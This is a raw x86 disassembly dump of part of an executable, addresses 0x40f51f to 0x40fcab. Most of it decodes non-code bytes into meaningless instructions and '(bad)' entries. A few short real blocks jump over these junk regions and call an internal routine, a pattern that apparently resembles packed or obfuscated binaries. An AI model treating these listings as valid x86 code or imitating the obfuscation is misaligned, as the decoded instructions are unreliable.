  40f51f:	out    0x3d,eax
  40f521:	in     al,0x17
  40f523:	push   cs
  40f524:	sti    
  40f525:	or     bl,bl
  40f527:	adc    al,0xcf
  40f529:	add    ecx,DWORD PTR [edi+0x1e17df83]
  40f52f:	shl    BYTE PTR [ebx-0x420e6734],1
  40f535:	mov    al,0x98
  40f537:	pop    ecx
  40f538:	shl    ah,1
  40f53a:	push   es
  40f53b:	scas   al,BYTE PTR es:[edi]
  40f53c:	xchg   esp,eax
  40f53d:	iret   
  40f53e:	adc    ebp,DWORD PTR [ebx]
  40f540:	add    DWORD PTR [eax+esi*1+0x29],ecx
  40f544:	arpl   WORD PTR [ebp+ebx*2-0x32],cx
  40f548:	call   0x7b10:0xca6026f9
  40f54f:	scas   eax,DWORD PTR es:[edi]
  40f550:	mov    edi,0x502634f1
  40f555:	jo     0x40f598
  40f557:	cmp    al,0xb7
  40f559:	cmp    bl,BYTE PTR [edx]
  40f55b:	and    al,0xfd
  40f55d:	or     edi,DWORD PTR [edi]
  40f55f:	cmp    cl,BYTE PTR [esi]
  40f561:	iret   
  40f562:	fdivr  QWORD PTR [esi+edi*1-0x7ba240da]
  40f569:	rol    DWORD PTR [ebx+0x71a5cd43],1
  40f56f:	mov    bl,BYTE PTR [eax]
  40f571:	dec    ebp
  40f572:	push   edx
  40f573:	rcl    DWORD PTR [ecx-0x9],1
  40f576:	sbb    BYTE PTR [eax-0x3b92469c],dh
  40f57c:	push   ebp
  40f57d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f57e:	int3   
  40f57f:	adc    DWORD PTR [eax-0x1c6525bf],ebp
  40f585:	cmp    DWORD PTR [esi-0x1f],ecx
  40f588:	pop    ss
  40f589:	push   es
  40f58a:	ss push cs
  40f58c:	inc    ebp
  40f58d:	and    ebx,DWORD PTR [edi]
  40f58f:	ret    
  40f590:	mov    edx,0x75cc207b
  40f595:	mov    esi,esi
  40f597:	push   ds
  40f598:	inc    ebp
  40f599:	stos   DWORD PTR es:[edi],eax
  40f59a:	in     al,0x19
  40f59c:	mov    dl,0x57
  40f59e:	mov    DWORD PTR [ebp-0x58],0x3082
  40f5a5:	mov    DWORD PTR [ebp-0x54],0x37a2
  40f5ac:	mov    DWORD PTR [ebp-0x50],0x49d6
  40f5b3:	mov    DWORD PTR [ebp-0x4c],0x6390
  40f5ba:	mov    DWORD PTR [ebp-0x48],0x40f2
  40f5c1:	mov    DWORD PTR [ebp-0x44],0x21d4
  40f5c8:	mov    DWORD PTR [ebp-0x28],0x4726
  40f5cf:	mov    DWORD PTR [ebp-0x24],0x221a
  40f5d6:	mov    DWORD PTR [ebp-0x30],0x768c
  40f5dd:	mov    DWORD PTR [ebp-0x2c],0x29e8
  40f5e4:	mov    DWORD PTR [ebp-0x40],0x6cf6
  40f5eb:	mov    DWORD PTR [ebp-0x3c],0x94c
  40f5f2:	mov    DWORD PTR [ebp-0x38],0x4797
  40f5f9:	mov    DWORD PTR [ebp-0x34],0x4439
  40f600:	mov    DWORD PTR [ebp-0x20],0x2531
  40f607:	mov    esi,0x5a3e
  40f60c:	mov    DWORD PTR [ebp-0x1c],esi
  40f60f:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  40f616:	mov    DWORD PTR [ebp-0x14],0x7
  40f61d:	mov    DWORD PTR [ebp-0x10],0xe3a
  40f624:	mov    DWORD PTR [ebp-0xc],0x6a6e
  40f62b:	mov    DWORD PTR [ebp-0x8],0x6b99
  40f632:	mov    DWORD PTR [ebp-0x4],0x2acd
  40f639:	mov    eax,DWORD PTR [ebp-0x10]
  40f63c:	mov    ecx,DWORD PTR [ebp-0xc]
  40f63f:	mov    eax,DWORD PTR [ebp-0x8]
  40f642:	mov    ecx,DWORD PTR [ebp-0x4]
  40f645:	mov    eax,DWORD PTR [ebp-0x18]
  40f648:	mov    ecx,DWORD PTR [ebp-0x14]
  40f64b:	mov    eax,DWORD PTR [ebp-0x8]
  40f64e:	jmp    0x40fa02
  40f653:	pusha  
  40f654:	and    cl,BYTE PTR [esi]
  40f656:	push   ebp
  40f657:	xchg   esp,eax
  40f658:	jns    0x40f602
  40f65a:	cmp    al,0x86
  40f65c:	aas    
  40f65d:	(bad)  
  40f65f:	add    DWORD PTR [esi-0x6],ebp
  40f662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f663:	pop    eax
  40f664:	push   ds
  40f665:	mov    esi,0xbec4e3be
  40f66a:	mov    esi,0x93b7bc07
  40f66f:	inc    edx
  40f670:	sub    al,0xf9
  40f672:	xor    eax,0x82295450
  40f677:	mov    esi,DWORD PTR [eax+0x1da5e51f]
  40f67d:	scas   eax,DWORD PTR es:[edi]
  40f67e:	push   edx
  40f67f:	jne    0x40f636
  40f681:	inc    esp
  40f682:	adc    eax,DWORD PTR [edx+0x71acf0d1]
  40f688:	enter  0x87fe,0x3d
  40f68c:	mov    esp,0xde2a1f80
  40f691:	outs   dx,DWORD PTR ds:[esi]
  40f692:	mov    ebp,DWORD PTR [edx+ebp*2+0x66b2ca3c]
  40f699:	push   esi
  40f69a:	scas   eax,DWORD PTR es:[edi]
  40f69b:	icebp  
  40f69c:	aam    0x66
  40f69e:	add    al,0x82
  40f6a0:	lea    edx,[esi]
  40f6a2:	sti    
  40f6a3:	shr    eax,cl
  40f6a5:	inc    ecx
  40f6a6:	test   al,0x6f
  40f6a8:	jmp    0xa6793594
  40f6ad:	les    ebp,FWORD PTR [ebp+0x574468be]
  40f6b3:	or     BYTE PTR gs:[edi],ah
  40f6b6:	call   DWORD PTR [edx-0x20]
  40f6b9:	das    
  40f6ba:	cmp    al,0xe5
  40f6bc:	sbb    DWORD PTR [esi-0x6],edx
  40f6bf:	dec    eax
  40f6c0:	iret   
  40f6c1:	xor    eax,0xb60bc3fb
  40f6c6:	xor    DWORD PTR [ebp+0x3c3fd546],0xfffffffe
  40f6cd:	jb     0x40f6d2
  40f6cf:	jno    0x40f70c
  40f6d1:	jg     0x40f68a
  40f6d3:	sahf   
  40f6d4:	mov    al,ds:0xaf6bf85
  40f6d9:	aas    
  40f6da:	outs   dx,BYTE PTR ds:[esi]
  40f6db:	lods   eax,DWORD PTR ds:[esi]
  40f6dc:	sahf   
  40f6dd:	std    
  40f6de:	ins    DWORD PTR es:[edi],dx
  40f6df:	lock push esp
  40f6e1:	mov    ebx,0x20e28bfc
  40f6e6:	lock aad 0x34
  40f6e9:	lock jge 0x40f693
  40f6ec:	push   ebp
  40f6ed:	pop    esp
  40f6ee:	xchg   ebx,eax
  40f6ef:	arpl   WORD PTR [edi+0x2e],cx
  40f6f2:	jge    0x40f703
  40f6f4:	sub    DWORD PTR [ebx+edx*4-0x6d4bece1],ecx
  40f6fb:	cdq    
  40f6fc:	dec    DWORD PTR [eax-0x36]
  40f6ff:	jns    0x40f706
  40f701:	mov    dl,0x5b
  40f703:	or     al,0x7d
  40f705:	fidivr WORD PTR [edx-0x13328ccf]
  40f70b:	(bad)  
  40f70c:	mov    fs,WORD PTR [ebp+0x751fc6c8]
  40f712:	rcr    DWORD PTR [ecx],1
  40f714:	mov    dh,0x5
  40f716:	jns    0x40f733
  40f718:	je     0x40f761
  40f71a:	xchg   edi,eax
  40f71b:	adc    ebp,DWORD PTR [ecx-0x2d]
  40f71e:	jnp    0x40f6b6
  40f720:	xor    edx,ebp
  40f722:	adc    esp,ebx
  40f724:	shl    DWORD PTR [edi-0x5e],0xce
  40f728:	and    eax,0xaf19b837
  40f72d:	xchg   BYTE PTR [ebx+0x79],dh
  40f730:	mov    esi,0x9dce32b8
  40f735:	fsubr  QWORD PTR [eax]
  40f737:	or     bh,cl
  40f739:	and    eax,0x781b556e
  40f73e:	sbb    cl,BYTE PTR [ecx-0x69]
  40f741:	xchg   edi,eax
  40f742:	sub    edx,0xd326f5e5
  40f748:	test   eax,0x714968f8
  40f74d:	push   edx
  40f74e:	push   esp
  40f74f:	jbe    0x40f7a4
  40f751:	das    
  40f752:	imul   ebx,DWORD PTR [ebx+0x35a3965],0x36970a0c
  40f75c:	test   al,0xbd
  40f75e:	fistp  WORD PTR [edi-0x10]
  40f761:	repnz loop 0x40f6f6
  40f764:	gs fwait
  40f766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f767:	adc    dh,BYTE PTR [ecx-0x76]
  40f76a:	mov    ebx,0x6bbdc7e2
  40f76f:	test   ebp,eax
  40f771:	out    dx,eax
  40f772:	push   edi
  40f773:	add    al,BYTE PTR [edi]
  40f775:	mov    cl,0x6f
  40f777:	dec    ebp
  40f778:	dec    edx
  40f779:	mov    ebx,0xe8e16925
  40f77e:	lds    edi,FWORD PTR [ecx-0x44e0398]
  40f784:	cmc    
  40f785:	cmc    
  40f786:	and    al,BYTE PTR [ecx+0x7a4eca50]
  40f78c:	mov    eax,ds:0xc8b559c8
  40f791:	ss pop edi
  40f793:	rdpmc  
  40f795:	leave  
  40f796:	and    DWORD PTR [edx-0x79],edx
  40f799:	xor    ah,BYTE PTR [eax-0x37]
  40f79c:	jecxz  0x40f733
  40f79e:	pop    eax
  40f79f:	mov    bh,0x20
  40f7a1:	scas   eax,DWORD PTR es:[edi]
  40f7a2:	mov    bh,0x5b
  40f7a4:	adc    esp,DWORD PTR [esi]
  40f7a6:	jae    0x40f7f6
  40f7a8:	(bad)  [ebx+ebp*4-0x41929039]
  40f7af:	dec    esp
  40f7b0:	mov    eax,0x4f90d48a
  40f7b5:	jns    0x40f7df
  40f7b7:	popa   
  40f7b8:	out    dx,eax
  40f7b9:	sub    BYTE PTR [edx+0x54],dl
  40f7bc:	loope  0x40f812
  40f7be:	and    ebx,ebx
  40f7c0:	daa    
  40f7c1:	and    al,0x7b
  40f7c3:	leave  
  40f7c4:	sahf   
  40f7c5:	add    eax,0x3544a46c
  40f7ca:	fucom  st(6)
  40f7cc:	sbb    BYTE PTR [ecx],0xeb
  40f7cf:	push   cs
  40f7d0:	pop    edx
  40f7d1:	shl    DWORD PTR [edi],1
  40f7d3:	icebp  
  40f7d4:	retf   0x434e
  40f7d7:	ds adc eax,0x7cf0b274
  40f7dd:	(bad)  
  40f7df:	daa    
  40f7e0:	scas   eax,DWORD PTR es:[edi]
  40f7e1:	inc    ebx
  40f7e2:	mov    eax,ds:0xbbc71a60
  40f7e7:	scas   eax,DWORD PTR es:[edi]
  40f7e8:	sti    
  40f7e9:	(bad)  
  40f7ea:	rol    DWORD PTR [esp+ebx*4],cl
  40f7ed:	cmc    
  40f7ee:	(bad)  
  40f7ef:	popf   
  40f7f0:	fwait
  40f7f1:	push   ss
  40f7f2:	fidiv  WORD PTR [esi+0x47f2b2f]
  40f7f8:	pusha  
  40f7f9:	call   0x820f:0xdb8b2440
  40f800:	push   ebp
  40f801:	jg     0x40f819
  40f803:	pop    edx
  40f804:	(bad)  
  40f805:	jmp    0x7186:0x905ede4c
  40f80c:	pop    ecx
  40f80d:	call   0xbca267ef
  40f812:	mov    ds:0xf90965ba,eax
  40f817:	test   al,0x8c
  40f819:	jle    0x40f896
  40f81b:	dec    esi
  40f81c:	jnp    0x40f79e
  40f81e:	aad    0xae
  40f820:	fisub  DWORD PTR [ecx]
  40f822:	dec    esp
  40f823:	imul   DWORD PTR [ecx]
  40f825:	xchg   edi,eax
  40f826:	mov    dl,0xaa
  40f828:	inc    edi
  40f829:	jg     0x40f89e
  40f82b:	mov    esi,0x758ebf59
  40f830:	lods   eax,DWORD PTR ds:[esi]
  40f831:	ins    DWORD PTR es:[edi],dx
  40f832:	std    
  40f833:	ror    DWORD PTR [ebp-0x187a0e87],1
  40f839:	gs in  eax,dx
  40f83b:	test   DWORD PTR [esi],esi
  40f83d:	div    edi
  40f83f:	pop    ss
  40f840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f841:	sbb    eax,0xa2d3c49
  40f846:	sbb    ch,bh
  40f848:	in     eax,0x28
  40f84a:	rcr    DWORD PTR [ebx],1
  40f84c:	sub    edi,DWORD PTR [esi]
  40f84e:	pop    edx
  40f84f:	ss cdq 
  40f851:	popa   
  40f852:	enter  0x7cf7,0x1b
  40f856:	in     al,dx
  40f857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f858:	(bad)
  40f85b:	cmp    ecx,DWORD PTR [edi-0x627100b8]
  40f861:	daa    
  40f862:	fwait
  40f863:	lds    edx,FWORD PTR ds:0x9f2c8c95
  40f869:	jae    0x40f84f
  40f86b:	int3   
  40f86c:	mov    eax,ds:0x38989bdd
  40f871:	ret    0x87ce
  40f874:	sbb    al,BYTE PTR ds:0x1760cf5c
  40f87a:	lahf   
  40f87b:	cmp    al,0x92
  40f87d:	mov    dl,0x4f
  40f87f:	xor    DWORD PTR [ebx-0x3e810d3b],0x24
  40f886:	cld    
  40f887:	dec    esi
  40f888:	fiadd  WORD PTR [eax]
  40f88a:	push   DWORD PTR [edi+0x57b2cac9]
  40f890:	std    
  40f891:	push   edx
  40f892:	mov    edx,0xc9d9f226
  40f897:	jge    0x40f82e
  40f899:	xor    al,0xf2
  40f89b:	jne    0x40f851
  40f89d:	dec    ebp
  40f89e:	and    DWORD PTR [ebx+eiz*8-0x498ba24b],0x7248b0fd
  40f8a9:	pop    ss
  40f8aa:	xor    eax,0x1f40b299
  40f8af:	dec    edx
  40f8b0:	(bad)  
  40f8b1:	sub    al,0xae
  40f8b3:	imul   esp,DWORD PTR [eax+0x65],0xffffffb0
  40f8b7:	jecxz  0x40f861
  40f8b9:	jns    0x40f896
  40f8bb:	push   ebx
  40f8bc:	scas   al,BYTE PTR es:[edi]
  40f8bd:	push   ebx
  40f8be:	inc    ebx
  40f8bf:	xor    al,0x29
  40f8c1:	(bad)  
  40f8c3:	mov    edi,0xd74caba4
  40f8c8:	jle    0x40f92c
  40f8ca:	loope  0x40f91d
  40f8cc:	in     eax,0x31
  40f8ce:	mov    ebx,0x63a648da
  40f8d3:	aam    0x4d
  40f8d5:	mov    ah,0x6a
  40f8d7:	jns    0x40f866
  40f8d9:	inc    esp
  40f8da:	push   esi
  40f8db:	cmp    ecx,DWORD PTR [edi-0x143c602a]
  40f8e1:	mov    edi,DWORD PTR [edi+eiz*4]
  40f8e4:	push   ecx
  40f8e5:	mov    ebp,0xb9958ee5
  40f8ea:	hlt    
  40f8eb:	push   0x85e121f9
  40f8f0:	cld    
  40f8f1:	adc    BYTE PTR [edx-0x3e],dh
  40f8f4:	shl    DWORD PTR [esi+0x51],1
  40f8f7:	les    ebp,FWORD PTR [ecx+0x34]
  40f8fa:	inc    edx
  40f8fb:	cmp    ebx,DWORD PTR [edx-0x4101122c]
  40f901:	inc    edx
  40f902:	scas   eax,DWORD PTR es:[edi]
  40f903:	mov    ch,0xe
  40f905:	cli    
  40f906:	pop    eax
  40f907:	(bad)  
  40f908:	ret    0x7a51
  40f90b:	imul   edx
  40f90d:	popf   
  40f90e:	loop   0x40f97a
  40f910:	and    DWORD PTR [edx+edi*1+0x74050057],edx
  40f917:	ja     0x40f919
  40f919:	shr    BYTE PTR [edx-0xd],1
  40f91c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f91d:	pushf  
  40f91e:	gs out dx,eax
  40f920:	sbb    eax,0x4b7650f
  40f925:	in     eax,dx
  40f926:	mov    bh,0xdd
  40f928:	pop    eax
  40f929:	jns    0x40f912
  40f92b:	add    DWORD PTR [esi+0x5d],eax
  40f92e:	(bad)  [ecx]
  40f930:	pusha  
  40f931:	mov    dh,0xef
  40f933:	dec    ebx
  40f934:	or     al,0xa9
  40f936:	adc    al,0x84
  40f938:	lds    esi,FWORD PTR [ebp-0x5c1270ee]
  40f93e:	aad    0x71
  40f940:	and    al,0xe6
  40f942:	jmp    0x6e7b:0xd2555541
  40f949:	bound  ebx,QWORD PTR [ebx]
  40f94b:	out    0x8b,eax
  40f94d:	pop    DWORD PTR [ebp-0x4c284c11]
  40f953:	je     0x40f943
  40f955:	pop    edx
  40f956:	shr    BYTE PTR [esi+0x1a],0x57
  40f95a:	cmp    eax,0x4e131f13
  40f95f:	xlat   BYTE PTR ds:[ebx]
  40f960:	pop    ebx
  40f961:	repnz dec ebp
  40f963:	xchg   ah,bh
  40f965:	xor    DWORD PTR [esp+esi*2-0x52757ceb],0x1fc42c4d
  40f970:	and    ch,bh
  40f972:	lods   eax,DWORD PTR ds:[esi]
  40f973:	jbe    0x40f996
  40f975:	es aas 
  40f977:	psubusb mm2,QWORD PTR [ecx+0x7d]
  40f97b:	sub    ebp,ebx
  40f97d:	mov    edx,0xb6c73e34
  40f982:	jp     0x40f966
  40f984:	push   0x7
  40f986:	push   ds
  40f987:	cli    
  40f988:	inc    edx
  40f989:	jp     0x40f9f1
  40f98b:	xor    cl,dl
  40f98d:	jo     0x40f9db
  40f98f:	mov    esi,0x2418fd4b
  40f994:	inc    edx
  40f995:	pop    ebx
  40f996:	adc    ah,bl
  40f998:	(bad)  
  40f99a:	fwait
  40f99b:	test   DWORD PTR [edx-0x69],0xfec3d582
  40f9a2:	push   ecx
  40f9a3:	sbb    BYTE PTR [edi],ch
  40f9a5:	sahf   
  40f9a6:	push   eax
  40f9a7:	lods   al,BYTE PTR ss:[esi]
  40f9a9:	test   eax,0x154498b8
  40f9ae:	sub    BYTE PTR [edx+0x30],dl
  40f9b1:	lods   eax,DWORD PTR ds:[esi]
  40f9b2:	aad    0x75
  40f9b4:	dec    edx
  40f9b5:	loop   0x40f990
  40f9b7:	mov    esi,0xa8034539
  40f9bc:	adc    al,0x37
  40f9be:	xor    eax,0xfbe02742
  40f9c3:	jl     0x40f9bf
  40f9c5:	xlat   BYTE PTR ds:[ebx]
  40f9c6:	push   edi
  40f9c7:	jle    0x40f9a6
  40f9c9:	push   ebx
  40f9ca:	test   al,0xa9
  40f9cc:	xchg   esp,eax
  40f9cd:	jecxz  0x40fa3a
  40f9cf:	sub    al,0xf7
  40f9d1:	js     0x40f9e2
  40f9d3:	mov    bh,0xf3
  40f9d5:	xor    dl,BYTE PTR ds:0x5ce2a83e
  40f9db:	xor    bl,BYTE PTR [ebx+ecx*1-0x614a4482]
  40f9e2:	xor    al,0x6b
  40f9e4:	jg     0x40fa39
  40f9e6:	std    
  40f9e7:	push   ebp
  40f9e8:	lds    ecx,FWORD PTR [esi]
  40f9ea:	sbb    bl,BYTE PTR [esi+0x2e]
  40f9ed:	pop    ecx
  40f9ee:	and    ecx,0x4b
  40f9f1:	fcom   QWORD PTR [eax-0x7c4055b1]
  40f9f7:	pop    edx
  40f9f8:	(bad)  
  40f9fa:	(bad)  
  40f9fb:	aas    
  40f9fc:	xor    esi,eax
  40f9fe:	mov    ds,esi
  40fa00:	or     esi,DWORD PTR [esi]
  40fa02:	mov    ecx,DWORD PTR [ebp-0x4]
  40fa05:	mov    edx,DWORD PTR [ebp-0x10]
  40fa08:	mov    edi,DWORD PTR [ebp-0xc]
  40fa0b:	add    eax,edx
  40fa0d:	mov    edx,DWORD PTR [ebp-0x18]
  40fa10:	adc    ecx,edi
  40fa12:	mov    edi,DWORD PTR [ebp-0x14]
  40fa15:	push   edi
  40fa16:	push   edx
  40fa17:	or     ecx,0x6833
  40fa1d:	or     eax,0x6b80
  40fa22:	push   ecx
  40fa23:	push   eax
  40fa24:	call   0x422286
  40fa29:	mov    ecx,DWORD PTR [ebp-0x20]
  40fa2c:	mov    edi,DWORD PTR [ebp-0x1c]
  40fa2f:	and    eax,0x25cb
  40fa34:	jmp    0x40fde8
  40fa39:	js     0x40fa83
  40fa3b:	cld    
  40fa3c:	(bad)  
  40fa3e:	jb     0x40fabc
  40fa40:	pop    eax
  40fa41:	dec    eax
  40fa42:	lods   eax,DWORD PTR ds:[esi]
  40fa43:	push   cs
  40fa44:	sahf   
  40fa45:	popa   
  40fa46:	inc    eax
  40fa47:	js     0x40f9db
  40fa49:	jge    0x40fa71
  40fa4b:	mov    esi,0xbec4e3be
  40fa50:	mov    esi,0xda9ff288
  40fa55:	jbe    0x40fa9b
  40fa57:	inc    eax
  40fa58:	shr    BYTE PTR [edx+0x14],0x4e
  40fa5c:	xor    ebx,esp
  40fa5e:	dec    eax
  40fa5f:	adc    al,0x2e
  40fa61:	sub    al,0x2f
  40fa63:	fsub   DWORD PTR [edx]
  40fa65:	push   esi
  40fa66:	push   ds
  40fa67:	mov    ds,WORD PTR [esi-0x1d525e99]
  40fa6d:	idiv   DWORD PTR [edx+0x5f]
  40fa70:	xchg   edi,eax
  40fa71:	jnp    0x40fab9
  40fa73:	jecxz  0x40fab4
  40fa75:	cdq    
  40fa76:	add    BYTE PTR [ecx],cl
  40fa78:	das    
  40fa79:	mov    edi,0x44964c78
  40fa7e:	jmp    0xe0d8335f
  40fa83:	sub    cl,ah
  40fa85:	mov    esp,DWORD PTR [esi+0x37]
  40fa88:	push   ebx
  40fa89:	or     ebp,eax
  40fa8b:	cmp    ch,BYTE PTR [ecx]
  40fa8d:	xor    al,0x7
  40fa8f:	shr    dh,cl
  40fa91:	push   ebp
  40fa92:	xor    DWORD PTR [ebx+0x37],0x7c
  40fa96:	cwde   
  40fa97:	out    dx,eax
  40fa98:	ins    BYTE PTR es:[edi],dx
  40fa99:	mov    ebp,0x417f5168
  40fa9e:	jbe    0x40fa54
  40faa0:	mov    BYTE PTR [ebx],al
  40faa2:	(bad)  
  40faa3:	lods   eax,DWORD PTR ds:[esi]
  40faa4:	jns    0x40fb08
  40faa6:	cs cmp bl,0xba
  40faaa:	xchg   edx,eax
  40faab:	jne    0x40fb17
  40faad:	sbb    edx,DWORD PTR [ecx+0x13]
  40fab0:	loope  0x40faf1
  40fab2:	loopne 0x40fa70
  40fab4:	retf   0xf23f
  40fab7:	(bad)  
  40fab8:	call   0x7ff72435
  40fabd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fabe:	dec    eax
  40fabf:	cmp    DWORD PTR ds:0xc296d8f5,0x17
  40fac6:	bound  eax,QWORD PTR [ebx]
  40fac8:	jmp    0x89b6aa44
  40facd:	mov    bl,0x85
  40facf:	xchg   ebx,eax
  40fad0:	test   DWORD PTR [eax+0x1b0f77e7],edi
  40fad6:	push   ebp
  40fad7:	jg     0x40fa90
  40fad9:	test   BYTE PTR [edi-0x1f],al
  40fadc:	dec    esi
  40fadd:	pop    edi
  40fade:	loope  0x40fab0
  40fae0:	jl     0x40faa8
  40fae2:	or     eax,0x892fbba6
  40fae7:	jnp    0x40fb20
  40fae9:	std    
  40faea:	pop    esp
  40faeb:	lods   al,BYTE PTR ds:[esi]
  40faec:	xor    ebx,DWORD PTR [eax+0x66]
  40faef:	jmp    0x40fa96
  40faf1:	(bad)  
  40faf2:	cmp    al,0xa5
  40faf4:	mov    al,0x3f
  40faf6:	out    dx,al
  40faf7:	and    cl,BYTE PTR [eax+0x84bf8e0]
  40fafd:	jmp    0x7d0f:0x5524a5c9
  40fb04:	sahf   
  40fb05:	retf   
  40fb06:	loop   0x40facb
  40fb08:	imul   eax,DWORD PTR [edx-0x75],0x71
  40fb0c:	sahf   
  40fb0d:	push   esp
  40fb0e:	stos   BYTE PTR es:[edi],al
  40fb0f:	icebp  
  40fb10:	imul   edx,DWORD PTR [esi],0x4af66056
  40fb16:	mov    esi,0x92b14b3
  40fb1b:	xlat   BYTE PTR ds:[ebx]
  40fb1c:	mov    al,0x9f
  40fb1e:	mov    ch,0x40
  40fb20:	lock lock loop 0x40face
  40fb24:	aaa    
  40fb25:	jno    0x40fba3
  40fb27:	in     al,dx
  40fb28:	mov    ecx,0x52241d1b
  40fb2d:	sub    cl,cl
  40fb2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb30:	mov    edx,0xa488df4
  40fb36:	jnp    0x40fb29
  40fb38:	(bad)  
  40fb39:	pop    edx
  40fb3a:	lods   al,BYTE PTR ds:[esi]
  40fb3b:	lds    edi,FWORD PTR [esi-0x4fb7be5]
  40fb41:	mov    esp,eax
  40fb43:	or     al,0xe0
  40fb45:	jmp    0xa49e18b2
  40fb4a:	aad    0xc8
  40fb4c:	ins    BYTE PTR es:[edi],dx
  40fb4d:	mov    edx,DWORD PTR [ebp+ebx*8-0x7]
  40fb51:	es in  eax,dx
  40fb53:	push   ecx
  40fb54:	sbb    al,0x66
  40fb56:	fisttp DWORD PTR [eax]
  40fb58:	pop    esi
  40fb59:	xchg   ebp,eax
  40fb5a:	cmp    ah,BYTE PTR [edi-0x80]
  40fb5d:	loop   0x40fbcc
  40fb5f:	mov    cl,0x3
  40fb61:	sbb    al,0xaa
  40fb63:	test   DWORD PTR [esi+0x79c5703a],esi
  40fb69:	and    DWORD PTR [esi-0x7f],ebp
  40fb6c:	add    BYTE PTR [edi],cl
  40fb6e:	sub    ah,bl
  40fb70:	or     eax,0xfc67e27e
  40fb75:	fmul   QWORD PTR [ebx]
  40fb77:	std    
  40fb78:	sub    BYTE PTR [ecx+eiz*4+0x6ae34313],ch
  40fb7f:	jns    0x40fb55
  40fb81:	mov    DWORD PTR [ebx-0x28aa35e3],ebx
  40fb87:	lea    eax,[esp+eax*2+0x4ba19c7e]
  40fb8e:	pop    eax
  40fb8f:	adc    ebx,esi
  40fb91:	mov    al,0x28
  40fb93:	push   ss
  40fb94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb95:	and    al,0x23
  40fb97:	mov    dl,0xa4
  40fb99:	pushf  
  40fb9a:	lds    esi,FWORD PTR [esi]
  40fb9c:	dec    esp
  40fb9d:	push   ebp
  40fb9e:	leave  
  40fb9f:	hlt    
  40fba0:	push   esp
  40fba1:	mov    edx,0xb303e713
  40fba6:	fwait
  40fba7:	leave  
  40fba8:	xchg   edi,eax
  40fba9:	xor    ebx,eax
  40fbab:	adc    al,0x42
  40fbad:	jge    0x40fbe1
  40fbaf:	xchg   edx,eax
  40fbb0:	adc    DWORD PTR [eax+0x6e640ea9],0xc0ba7467
  40fbba:	pusha  
  40fbbb:	mov    BYTE PTR [ecx-0x23afd206],ch
  40fbc1:	pop    eax
  40fbc2:	popa   
  40fbc3:	in     eax,dx
  40fbc4:	jmp    0x40fc15
  40fbc6:	hlt    
  40fbc7:	adc    cl,cl
  40fbc9:	sbb    esi,edi
  40fbcb:	scas   al,BYTE PTR es:[edi]
  40fbcc:	fadd   st(3),st
  40fbce:	cdq    
  40fbcf:	imul   ebp,DWORD PTR [ecx],0x13f14ca5
  40fbd5:	inc    ebp
  40fbd6:	push   ecx
  40fbd7:	imul   eax,DWORD PTR [esi-0x66],0xffffffae
  40fbdb:	cmp    dl,dl
  40fbdd:	jg     0x40fbeb
  40fbdf:	push   ebx
  40fbe0:	fsubrp st(3),st
  40fbe2:	(bad)  
  40fbe3:	push   ecx
  40fbe4:	xchg   cx,bx
  40fbe7:	jp     0x40fc27
  40fbe9:	sbb    ah,dl
  40fbeb:	leave  
  40fbec:	jne    0x40fc63
  40fbee:	add    ch,BYTE PTR ds:0x29c43e6e
  40fbf4:	pop    ebx
  40fbf5:	inc    esi
  40fbf6:	cmp    DWORD PTR [ebp+0x74e02ba9],ebx
  40fbfc:	ror    DWORD PTR [esi],1
  40fbfe:	call   0x6839:0x79902a7
  40fc05:	inc    ebx
  40fc06:	mov    dl,0xee
  40fc08:	or     eax,0x1aa80155
  40fc0d:	sub    dl,BYTE PTR [bx+si+0x40]
  40fc11:	stc    
  40fc12:	test   al,0xa4
  40fc14:	mov    bl,0x6f
  40fc16:	xchg   esi,eax
  40fc17:	std    
  40fc18:	call   0x675391c3
  40fc1d:	(bad)  
  40fc1e:	ins    BYTE PTR es:[edi],dx
  40fc1f:	mov    cl,0x93
  40fc21:	jae    0x40fc4b
  40fc23:	xor    BYTE PTR [edi],dl
  40fc25:	lods   al,BYTE PTR ds:[esi]
  40fc26:	dec    ebp
  40fc27:	jnp    0x40fbc7
  40fc29:	inc    ebp
  40fc2a:	pop    ss
  40fc2b:	and    BYTE PTR [ebx],ah
  40fc2d:	sub    DWORD PTR [ebp+0x43],esi
  40fc30:	arpl   WORD PTR [esp+eax*2+0x60c4608f],sp
  40fc37:	xchg   BYTE PTR [ebx+edx*1-0x46b2d523],ah
  40fc3e:	dec    eax
  40fc3f:	pusha  
  40fc40:	sbb    ebx,DWORD PTR [esi-0x7a19461a]
  40fc46:	fnstcw WORD PTR [edi]
  40fc48:	push   es
  40fc49:	and    DWORD PTR [eiz*1+0x74d85fae],ebx
  40fc50:	mov    ch,0xf0
  40fc52:	in     al,0xd7
  40fc54:	psubsw mm4,mm0
  40fc57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc58:	imul   esp,DWORD PTR [esi-0x3c],0xbae39420
  40fc5f:	call   0x90e46163
  40fc64:	data16 mov bl,0x9b
  40fc67:	mov    ebx,ebx
  40fc69:	pop    ebx
  40fc6a:	gs and ch,dl
  40fc6d:	lods   eax,DWORD PTR ds:[esi]
  40fc6e:	mov    dh,ch
  40fc70:	out    dx,eax
  40fc71:	loope  0x40fce0
  40fc73:	add    ecx,DWORD PTR [edx-0x54e5b094]
  40fc79:	push   esi
  40fc7a:	fisttp WORD PTR [esi-0x1d214299]
  40fc80:	jecxz  0x40fc84
  40fc82:	add    eax,0xe6753e30
  40fc87:	pop    esp
  40fc88:	test   BYTE PTR [ecx+esi*8-0x67db75b8],cl
  40fc8f:	lock sub bl,BYTE PTR [ebp-0x5d]
  40fc93:	mov    al,0x84
  40fc95:	out    dx,eax
  40fc96:	inc    esp
  40fc97:	ins    BYTE PTR es:[edi],dx
  40fc98:	and    DWORD PTR [edx-0x75f7fcd4],ebx
  40fc9e:	sub    BYTE PTR [esi+0x48],0x47
  40fca2:	mov    dl,0x2b
  40fca4:	dec    edi
  40fca5:	std    
  40fca6:	jb     0x40fd07
  40fca8:	daa    
  40fca9:	shl    ebp,1
  40fcab:	pushf  
